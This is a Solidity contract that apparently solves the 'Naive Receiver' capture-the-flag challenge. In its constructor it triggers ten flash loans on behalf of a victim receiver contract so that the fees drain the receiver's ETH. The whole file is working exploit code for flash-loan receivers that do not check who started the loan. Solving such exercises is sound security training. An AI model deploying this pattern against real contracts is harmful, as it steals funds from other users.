// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC3156FlashBorrower {
    function onFlashLoan(
        address sender,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

interface INaiverReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract NaiveReceiverAttack {
    INaiverReceiverLenderPool pool;
    IERC3156FlashBorrower receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _receiver, address _pool) {
        receiver = IERC3156FlashBorrower(_receiver);
        pool = INaiverReceiverLenderPool(_pool);
        for(uint i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 1 ether, "");
        }
    }
}